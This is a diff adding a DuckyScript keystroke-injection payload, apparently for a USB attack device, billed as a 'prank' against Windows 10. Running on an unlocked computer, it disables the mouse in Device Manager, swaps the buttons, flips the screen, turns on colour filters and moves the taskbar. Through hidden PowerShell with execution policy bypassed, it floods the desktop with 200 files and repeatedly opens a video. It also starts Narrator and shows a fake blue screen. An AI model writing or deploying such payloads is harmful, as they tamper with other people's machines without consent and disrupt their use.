@@ -1,0 +1,172 @@
+REM ###########################################
+REM #                                         |
+REM # Title        : Window Settings Bomb     |
+REM # Author       : AbeNaws                  |
+REM # Version      : 1.0                      |
+REM # Category     : Prank                    |
+REM # Target       : Windows 10               |
+REM #                                         |
+REM ###########################################
+
+REM Mouse Disable
+DELAY 1000
+GUI
+DELAY 500
+STRING device manager
+DELAY 100
+ENTER
+DELAY 5000
+TAB
+STRING mice
+RIGHT
+DOWN
+DOWN
+ENTER
+DELAY 500
+SHIFT TAB
+RIGHT
+TAB
+TAB
+TAB
+ENTER
+DELAY 300
+LEFT
+ENTER
+ALT F4
+DELAY 100
+ALT F4
+
+REM Mouse Size (Win10)
+DELAY 100
+GUI
+DELAY 500
+STRING mouse size
+DELAY 100
+ENTER
+DELAY 2000
+RIGHT
+RIGHT
+RIGHT
+RIGHT
+RIGHT
+RIGHT
+RIGHT
+RIGHT
+RIGHT
+RIGHT
+RIGHT
+RIGHT
+RIGHT
+RIGHT
+DELAY 100
+TAB
+DELAY 100
+RIGHT
+RIGHT
+ENTER
+DELAY 100
+
+REM Mouse Flip
+DELAY 100
+GUI
+DELAY 500
+STRING mouse settings
+DELAY 100
+ENTER
+DELAY 2000
+ENTER
+DOWN
+ENTER
+DELAY 100
+
+REM Color Filter
+DELAY 100
+GUI
+DELAY 500
+STRING color filters
+DELAY 100
+ENTER
+DELAY 2000
+SPACE
+TAB
+TAB
+SPACE
+DELAY 100
+
+REM Screen Flip
+DELAY 100
+GUI
+DELAY 500
+STRING display orientation
+DELAY 100
+ENTER
+DELAY 2000
+ENTER
+DOWN
+ENTER
+DELAY 1000
+TAB 
+ENTER
+DELAY 100
+
+REM Move Taskbar (Win10)
+DELAY 100
+GUI
+DELAY 500
+STRING taskbar location
+DELAY 100
+ENTER
+DELAY 2000
+ENTER
+UP
+ENTER
+DELAY 100
+ALT F4
+
+REM Desktop Flood
+DELAY 100
+GUI r
+DELAY 500
+REM                               Repeat count $n=#; 
+STRING powershell -w h -NoP -NonI -Exec Bypass $n=200;$d=0;1..$n|%{New-Item -Path "$env:USERPROFILE\Desktop\$(('Don''t_','Leave_','Your_','Computer_','Unlocked_')[$_%5])$($_+1).txt" -ItemType File}
+ENTER
+
+REM Narrator
+DELAY 100
+GUI
+DELAY 500
+STRING narrator
+DELAY 100
+ENTER
+DELAY 2000
+RIGHT
+LEFT
+LEFT
+ENTER
+DELAY 500
+LEFT
+DELAY 100
+LEFT
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+ENTER
+
+REM Delayed Rickroll
+DELAY 100
+GUI r
+DELAY 500
+REM                               Repeat count $n=#; | $d=#; Delay time in seconds
+STRING powershell -w h -NoP -NonI -Exec Bypass $n=6;$d=300;1..$n|%{Start-Sleep -s $d; Start-Process "https://shattereddisk.github.io/rickroll/rickroll.mp4"}
+ENTER
+
+REM Blue Screen of Death
+DELAY 100
+GUI r
+DELAY 500
+STRING https://upload.wikimedia.org/wikipedia/commons/5/56/Bsodwindows10.png
+ENTER
+DELAY 1000
+F11
